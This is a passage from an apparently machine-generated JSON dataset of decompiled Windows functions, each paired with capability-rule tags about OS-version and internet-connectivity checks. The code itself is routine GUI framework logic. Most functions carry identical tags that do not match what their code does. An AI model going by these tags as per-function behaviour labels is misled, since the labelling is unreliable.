fcn.00422b32(piVar6, 0),  piVar6 == NULL)) {\n            return NULL;\n        }\n        if (piVar6 == NULL) {\ncode_r0x004437e1:\n            if (piVar6[1] == 0) {\n                fcn.0041901a();\n                pcVar1 = swi(3);\n                piVar6 = (*pcVar1)();\n                return piVar6;\n            }\n            uVar8 = (**(*piVar6[1] + 0x78))();\n            uVar8 = uVar8 & 0x8000000;\n        }\n        else {\n            if (piVar6[1] == 0) {\n                iVar7 = *piVar6;\n            }\n            else {\n                iVar7 = *(piVar6[1] + 0x24);\n            }\n            if (iVar7 == 0) goto code_r0x004437e1;\n            uVar8 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar7);\n        }\n        if (uVar8 == 0) {\n            return piVar6;\n        }\n        if (piVar6 == var_4h) {\n            return NULL;\n        }\n        if (var_4h == NULL) {\n            var_4h = piVar6;\n        }\n        iVar3 = iVar3 + 1;\n        if (0x1ff < iVar3) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 702
    },
    "004441f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004441f9(int32_t *arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    pcVar4 = arg_ch;\n    if (arg_ch != NULL) goto code_r0x0044420c;\n    do {\n        fcn.0041901a();\ncode_r0x0044420c:\n    } while (arg_10h == 0);\n    arg_ch = NULL;\n    cVar2 = *pcVar4;\n    pcVar5 = pcVar4;\n    while (cVar2 != '\\0') {\n        if (*pcVar5 == '%') {\n            cVar2 = pcVar5[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x00444264;\n                if (cVar2 < ':') goto code_r0x00444244;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x00444244:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar5 = pcVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x00444277;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                arg_ch = arg_ch + iVar3;\n            }\n        }\n        else {\ncode_r0x00444264:\n            iVar3 = fcn.0045d72f(*pcVar5);\n            if (iVar3 != 0) {\n                arg_ch = arg_ch + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = pcVar5 + 1;\ncode_r0x00444277:\n            arg_ch = arg_ch + 1;\n        }\n        cVar2 = *pcVar5;\n    }\n    pcVar5 = fcn.00401940(arg_ch);\n    cVar2 = *pcVar4;\n    do {\n        if (cVar2 == '\\0') {\n            fcn.00410110(pcVar5 - *arg_8h);\n            return;\n        }\n        if (*pcVar4 == '%') {\n            cVar2 = pcVar4[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x00444300;\n                if (cVar2 < ':') goto code_r0x004442bd;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x004442bd:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar4 = pcVar4 + 2;\n            if (arg_14h <= iVar3) {\n                *pcVar5 = '?';\n                goto code_r0x0044431d;\n            }\n            piVar1 = arg_10h + iVar3 * 4;\n            iVar3 = *piVar1;\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                fcn.0042498c(pcVar5, arg_ch + 1, *piVar1);\n                arg_ch = arg_ch - iVar3;\n                pcVar5 = pcVar5 + iVar3;\n            }\n        }\n        else {\ncode_r0x00444300:\n            iVar3 = fcn.0045d72f(*pcVar4);\n            if (iVar3 != 0) {\n                *pcVar5 = *pcVar4;\n                pcVar5 = pcVar5 + 1;\n                pcVar4 = pcVar4 + 1;\n                arg_ch = arg_ch + -1;\n            }\n            *pcVar5 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\ncode_r0x0044431d:\n            pcVar5 = pcVar5 + 1;\n            arg_ch = arg_ch + -1;\n        }\n        cVar2 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 1000
    },
    "004445ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004445ae(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 126
    },
    "0044469c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044469c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.00436335(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1] + -1;\n        piVar2 = iVar1 + 4 + *param_1 * iVar3;\n        for (; -1 < iVar3; iVar3 = iVar3 + -1) {\n            *piVar2 = param_1[3];\n            param_1[3] = piVar2;\n            piVar2 = piVar2 - *param_1;\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 199
    },
    "004449d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004449d1(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.004447e3(arg_10h + iVar1, 0xffffffff);\n            iVar3 = *(in_ECX + 4) + arg_8h;\n            fcn.0040e880(iVar3 + arg_10h, (*(in_ECX + 8) - arg_8h) - arg_10h, iVar3, iVar1 - arg_8h);\n            fcn.00459330(*(in_ECX + 4) + arg_8h, 0, arg_10h);\n        }\n        else {\n            fcn.004447e3(arg_10h + arg_8h, 0xffffffff);\n        }\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.0041901a();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 352
    },
    "00444f62": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00444f62(int32_t pszPath, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (pszPath == 0) {\n        fcn.0041901a();\n    }\n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(pszPath);\n    if (arg_ch == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        fcn.00417b55(arg_ch, arg_10h, uVar1, 0xffffffff);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "00444fa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444fa0(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint uVar5;\n    uchar *puStack848;\n    char *pcStack844;\n    uint uStack840;\n    uchar *puStack836;\n    uchar *puStack832;\n    uchar *pszPath;\n    char acStack784 [124];\n    uchar auStack660 [132];\n    uchar auStack528 [260];\n    char acStack268 [260];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ &stack0xfffffd6c;\n    iVar2 = fcn.0042b7b9();\n    *(iVar2 + 8) = *(param_1 + 0x44);\n    *(iVar2 + 0xc) = *(param_1 + 0x44);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    if ((iVar3 == 0) || (iVar3 == 0x104)) {\n        fcn.004198cf();\n    }\n    puVar4 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)();\n    if (puVar4 == NULL) {\n        fcn.004198cf();\n    }\n    *puVar4 = 0;\n    pszPath = &stack0xfffffef4;\n    puStack832 = 0x445029;\n    iVar3 = fcn.00444f62(pszPath, &stack0xfffffdf0, 0x104);\n    if (iVar3 != 0) {\n        puStack832 = 0x445032;\n        fcn.004198cf();\n    }\n    if (*(param_1 + 0x60) == 0) {\n        puStack832 = &stack0xfffffdf0;\n        puStack836 = 0x445044;\n        iVar3 = fcn.0045c8dc();\n        *(param_1 + 0x60) = iVar3;\n        if (iVar3 == 0) goto code_r0x00418fe6;\n    }\n    iVar3 = *(param_1 + 0x50);\n    if (iVar3 == 0) {\n        puStack832 = 0x100;\n        puStack836 = &stack0xfffffcf0;\n        uStack840 = 0xe000;\n        pcStack844 = 0x44506b;\n        iVar3 = fcn.00424172();\n        if (iVar3 == 0) {\n            pcStack844 = *(param_1 + 0x60);\n        }\n        else {\n            pcStack844 = &stack0xfffffcf0;\n        }\n        puStack848 = 0x44507d;\n        iVar3 = fcn.0045c8dc();\n        *(param_1 + 0x50) = iVar3;\n        if (iVar3 == 0) goto code_r0x00418fe6;\n    }\n    *(iVar2 + 0x10) = iVar3;\n    if (*(param_1 + 100) == 0) {\n        puStack848 = &stack0xfffffff8 + -puVar4;\n        if (*(param_1 + 0x6c) == 1) {\n            pcStack844 = \".CHM\";\n        }\n        else {\n            pcStack844 = \".HLP\";\n        }\n        fcn.0042498c(puVar4);\n        pcStack844 = &stack0xfffffef4;\n        puStack848 = 0x4450c1;\n        iVar2 = fcn.0045c8dc();\n        *(param_1 + 100) = iVar2;\n        if (iVar2 == 0) goto code_r0x00418fe6;\n        *puVar4 = 0;\n    }\n    if (*(param_1 + 0x68) == 0) {\n        pcStack844 = \".INI\";\n        puStack848 = 0x104;\n        uVar5 = fcn.0045d49b(&stack0xfffffdf0);\n        fcn.0040e7f0(uVar5);\n        iVar2 = fcn.0045c8dc(&stack0xfffffdf0);\n        *(param_1 + 0x68) = iVar2;\n        if (iVar2 == 0) {\ncode_r0x00418fe6:\n            puStack848 = 0x4a8560;\n            pcStack844 = &stack0xfffffd6c;\n            fcn.00456b8d(&stack0xfffffcb0, 0x49eca0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    puStack832 = 0x445117;\n    fcn.004566a8(pszPath);\n    return;\n}\n",
        "token_count": 1064
    },
    "0044511f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0044511f(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.0042b7b9();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    fcn.0042ac0b();\n    iVar3 = fcn.0042b7b9();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x48) = param_1;\n        *(iVar3 + 0x4c) = param_2;\n        *(iVar3 + 0x44) = unaff_ESI;\n        fcn.00444fa0();\n    }\n    iVar3 = fcn.0042b7b9();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.00425ada();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x4acfec = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 353
    },
    "0044558c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0044558c(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.004451f8(param_1, param_1, param_2);\n        fcn.00445546(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00445730": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044578c)\n// WARNING: Removing unreachable block (ram,0x00445798)\n\nvoid fcn.00445730(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    \n    uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    pcVar2 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = (*_sym.imp.USER32.dll_GetWindow)(uVar3);\n    pcVar1 = _sym.imp.USER32.dll_ShowWindow;\n    for (; iVar4 != 0; iVar4 = (*pcVar2)(iVar4, 2)) {\n        iVar5 = fcn.0041e6a5(iVar4);\n        if ((((iVar5 != 0) && (*0x25 != iVar4)) && (iVar6 = fcn.0044569f(*0x25, iVar4),  iVar6 != 0)) &&\n           (((uVar7 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar7 & 0x18000000) == 0 &&\n             ((*(iVar5 + 0x3c) & 2) != 0)) && (*(unaff_EBX + 0xb4) == 0)))) {\n            (*pcVar1)(iVar4, 4);\n            *(iVar5 + 0x3c) = *(iVar5 + 0x3c) & 0xfffffffd;\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004458c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004458c1(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *(param_1 + 0xb0);\n    if (param_2 != piVar1) {\n        *(param_1 + 0xb0) = 0;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x160))(0, param_2, piVar1);\n        }\n        if (((*(param_1 + 0xb0) == 0) && (*(param_1 + 0xb0) = param_2,  param_2 != NULL)) && (param_3 != 0)) {\n            (**(*param_2 + 0x160))(1, param_2, piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "004459d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004459d1(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_1 + 0x15c))();\n    if (iVar1 != 0) {\n        return param_1[0x25];\n    }\n    if ((param_1[0x23] != 0) && (*(param_1[0x23] + 0x94) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "00445bf4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00445bf4(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((arg_10h == 0) && (arg_8h != 0)) {\n        iVar1 = 0;\n    }\n    else {\n        uVar2 = (**0x4ab49c)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar2, 0, arg_ch, 0xffffffff, arg_8h, arg_10h);\n        if ((arg_8h != 0) && (arg_10h < iVar1)) {\n            iVar1 = fcn.00401070(0x80004005);\n        }\n        if ((0 < iVar1) && (arg_8h != 0)) {\n            *(arg_8h + -2 + iVar1 * 2) = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 228
    },
    "0044624b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044624b(uint arg_8h, uint lpIconName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_38h;\n    int32_t var_30h;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = fcn.0042b7b9();\n    iVar1 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), lpIconName);\n    if (iVar1 != 0) {\n        fcn.00459330(&var_58h, 0, 0x30);\n        var_38h = arg_8h;\n        (**(*in_ECX + 100))(&var_58h);\n        if (var_30h != 0) {\n            iVar2 = fcn.0042b7b9();\n            iVar2 = fcn.0041ca87(*(iVar2 + 8), var_30h, &var_28h);\n            if ((iVar2 != 0) && (var_14h != iVar1)) {\n                uVar3 = fcn.004216eb(var_28h, var_10h, var_ch, iVar1);\n                return uVar3;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 323
    },
    "00446395": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446395(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x2d] != NULL) {\n        piStack24 = 0x4463aa;\n        (*param_1[0x2d])();\n    }\n    piVar2 = (**(*param_1 + 0x13c))();\n    if (piVar2 != NULL) {\n        piStack24 = 0x4463c5;\n        iVar3 = (**(*piVar2 + 0x8c))();\n        if (iVar3 == 0) {\n            return;\n        }\n    }\n    piStack24 = 0x4463d3;\n    iVar3 = fcn.0042b7b9();\n    piVar4 = *(iVar3 + 4);\n    if ((piVar4 != NULL) && (piVar4[8] == param_1)) {\n        if (piVar2 == NULL) {\n            piStack24 = 0x4463ed;\n            iVar3 = (**(*piVar4 + 0x94))();\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n        piStack24 = 0x4463fc;\n        fcn.00426599();\n        iStack28 = 0x446405;\n        fcn.00426505();\n        iStack28 = 0x44640a;\n        iStack28 = fcn.00432188();\n        if (iStack28 == 0) {\n            fcn.004321a8();\n            return;\n        }\n        iStack28 = 0x44641b;\n        iVar3 = fcn.0042b7b9();\n        if ((*(iVar3 + 0x14) == '\\0') && (piVar4[8] == 0)) {\n            iStack28 = 0;\n            fcn.004247b8();\n            return;\n        }\n    }\n    if ((piVar2 != NULL) && (piVar2[0x13] != 0)) {\n        piStack24 = 0x446441;\n        var_4h = (**(*piVar2 + 0x60))();\n        do {\n            if (var_4h == NULL) {\n                piStack24 = 0x44646f;\n                (**(*piVar2 + 0x7c))();\n                return;\n            }\n            piStack24 = &fcn.00446395::var_4h;\n            iStack28 = 0x446453;\n            iVar3 = (**(*piVar2 + 100))();\n            if (iVar3 == 0) {\n                iStack28 = 0x4a8690;\n                piStack24 = &stack0xfffffffc;\n                fcn.00456b8d(&stack0xffffffe4, 0x49ed44);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            piStack24 = 0x44645e;\n            piVar4 = fcn.0041f1fc();\n        } while (piVar4 == param_1);\n        iStack28 = 0x446481;\n        piStack24 = param_1;\n        (**(*piVar2 + 0x94))();\n    }\n    piStack24 = 0x446488;\n    (**(*param_1 + 0x60))();\n    return;\n}\n",
        "token_count": 809
    },
    "00446609": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446609(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *piVar4;\n    int32_t *extraout_ECX;\n    \n    fcn.0041e5da();\n    uVar1 = fcn.004225b8();\n    piVar2 = in_ECX;\n    if ((uVar1 & 0x40000000) == 0) {\n        piVar2 = fcn.0041f23b();\n    }\n    piVar4 = NULL;\n    if (piVar2 == NULL) {\n        fcn.0041901a();\n        piVar4 = extraout_ECX;\n    }\n    if (arg_8h != piVar4) {\n        arg_ch = in_ECX;\n    }\n    if (arg_ch != piVar4) {\n        if ((piVar2 == arg_ch) ||\n           ((piVar4 = fcn.0041f23b(),  piVar2 == piVar4 &&\n            (iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(arg_ch[8], 0x36d, 0x40, 0),  iVar3 != 0)))) {\n            piVar4 = 0x1;\n        }\n        else {\n            piVar4 = NULL;\n        }\n    }\n    piVar2[0xf] = piVar2[0xf] & 0xffffffdf;\n    if (piVar4 != NULL) {\n        piVar2[0xf] = piVar2[0xf] | 0x20;\n    }\n    fcn.004460a2((piVar4 == NULL) * '\\x04' + '\\x04');\n    piVar2 = in_ECX[0x2c];\n    if (piVar2 == NULL) {\n        iVar3 = (**(*in_ECX + 0x140))();\n        piVar2 = *(iVar3 + 0xb0);\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    if ((arg_8h != NULL) && (arg_10h == 0)) {\n        (**(*piVar2 + 0x160))(1, piVar2, piVar2);\n    }\n    (**(*piVar2 + 0x164))(arg_8h);\n    return;\n}\n",
        "token_count": 549
    },
    "004466ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004466ea(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0041f23b();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0041901a();\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    param_2 = param_2 & 0xfff0;\n    if (*(iVar2 + 0x68) == 0) {\ncode_r0x0044672f:\n        fcn.0041e5da();\n    }\n    else {\n        if (param_2 < 0xf041) {\n            if (((param_2 != 0xf040) && (param_2 != 0xf000)) && (param_2 != 0xf010)) {\n                iVar2 = param_2 - 0xf020;\ncode_r0x00446728:\n                if ((iVar2 != 0) && (iVar2 != 0x10)) goto code_r0x0044672f;\n            }\n        }\n        else if ((param_2 != 0xf050) && (param_2 != 0xf060)) {\n            iVar2 = param_2 - 0xf120;\n            goto code_r0x00446728;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x365, 0, (param_2 - 0xf000 >> 4) + 0x1ef00);\n        if (iVar2 == 0) {\n            (*pcVar1)(*(param_1 + 0x20), 0x111, 0xe147, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "00446981": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446981(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if (arg_8h == NULL) {\n        fcn.0041901a();\n    }\n    piVar1 = fcn.004459bd();\n    if (arg_10h == 0) {\n        fcn.00422a19(0, 0, 0, 0, 0, (-(arg_ch != 0) & 0xffffffc0) + 0x80 | 0x17);\n        (**(*arg_8h + 0x150))(arg_ch);\n        if ((arg_ch != 0) || (iVar2 = fcn.004459d1(),  iVar2 == 0)) {\n            (**(*piVar1 + 0x148))(0);\n        }\n    }\n    else {\n        (**(*arg_8h + 0x150))(arg_ch);\n        piVar1[0x34] = piVar1[0x34] | 0xc;\n    }\n    iVar2 = fcn.004459d1();\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_8h[0x23] == NULL) {\n        uVar3 = arg_ch != 0;\n    }\n    else {\n        uVar3 = (**(*arg_8h[0x23] + 0x16c))();\n    }\n    if (uVar3 == 1) {\n        if (arg_ch != 0) {\n            piVar1[0x28] = -1;\n            if (arg_10h == 0) {\n                uVar4 = 8;\n                goto code_r0x00446a68;\n            }\n            piVar1[0x28] = 8;\n            goto code_r0x00446a76;\n        }\n    }\n    else if (uVar3 == 0) {\n        piVar1[0x28] = -1;\n        if (arg_10h != 0) {\n            piVar1[0x28] = 0;\n            return;\n        }\n        uVar4 = 0;\ncode_r0x00446a68:\n        fcn.004226fd(uVar4);\n        return;\n    }\n    if (arg_10h != 0) {\n        return;\n    }\ncode_r0x00446a76:\n    (**(*piVar1 + 0x148))(0);\n    return;\n}\n",
        "token_count": 580
    },
    "00446a86": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446a86(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint arg_ch_00;\n    int32_t iVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0043201b(*(in_ECX + 0x20));\n    if ((arg_10h == 0) &&\n       ((*(in_ECX + 0x80) == NULL || (iVar2 = (**(**(in_ECX + 0x80) + 0x74))(arg_8h, arg_ch, 0),  iVar2 == 0)))) {\n        if (arg_8h == 0) {\n            fcn.0041901a();\n        }\n        fcn.00421f8e();\n        iVar2 = fcn.0042b206();\n        pcVar1 = _sym.imp.USER32.dll_GetMenu;\n        if ((((*(iVar2 + 0x78) != *(arg_8h + 4)) &&\n             (iVar2 = (*_sym.imp.USER32.dll_GetMenu)(*(in_ECX + 0x20)),  iVar2 != 0)) &&\n            (iVar2 = fcn.0041ffa6(),  iVar2 != 0)) && (iVar2 = (*pcVar1)(*(iVar2 + 0x20)),  iVar2 != 0)) {\n            iVar3 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n            iVar7 = 0;\n            if (0 < iVar3) {\n                do {\n                    iVar8 = iVar7;\n                    iVar4 = (*_sym.imp.USER32.dll_GetSubMenu)(iVar2, iVar7);\n                    if (iVar4 == *(arg_8h + 